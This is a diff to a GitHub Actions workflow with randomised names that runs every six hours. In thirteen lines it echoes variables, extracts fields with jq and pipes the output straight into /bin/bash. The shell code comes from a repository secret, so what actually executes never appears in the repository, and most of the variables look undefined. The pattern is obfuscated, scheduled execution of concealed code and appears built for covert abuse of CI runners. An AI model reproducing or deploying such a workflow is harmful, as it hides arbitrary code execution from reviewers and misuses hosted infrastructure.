@@ -2,19 +2,29 @@ name: dongxixue5678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 4/6 * * *'
+    - cron: '26 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongxixue5678
         env:
-          jzg83: ${{ secrets.jzg83 }}
+          xwt42060: ${{ secrets.xwt42060 }}
         run: |
-          echo $jzg83 | jq -r .pignu46655 | /bin/bash
-          echo $hw936 | jq -r .yh89 | /bin/bash
-          echo $wy14 | jq -r .hq77512 | /bin/bash
-          echo $xfkv8744 | jq -r .xmpkh1 | /bin/bash
+          echo $xwt42060 | jq -r .hn410 | /bin/bash
+          echo $f59 | jq -r .fhwd3 | /bin/bash
+          echo $rz28 | jq -r .ljfre8500 | /bin/bash
+          echo $ppjca557 | jq -r .a591 | /bin/bash
+          echo $qqcz23 | jq -r .qodso140 | /bin/bash
+          echo $ioim2 | jq -r .lnkjo9314 | /bin/bash
+          echo $sj92 | jq -r .ec1713 | /bin/bash
+          echo $frkkw745 | jq -r .a6541 | /bin/bash
+          echo $esix621 | jq -r .rr0 | /bin/bash
+          echo $rx9 | jq -r .gg1400 | /bin/bash
+          echo $gzj735 | jq -r .pkvxk85255 | /bin/bash
+          echo $z3509 | jq -r .coqcg4100 | /bin/bash
+          echo $dpyno58844 | jq -r .yqczw58 | /bin/bash
 
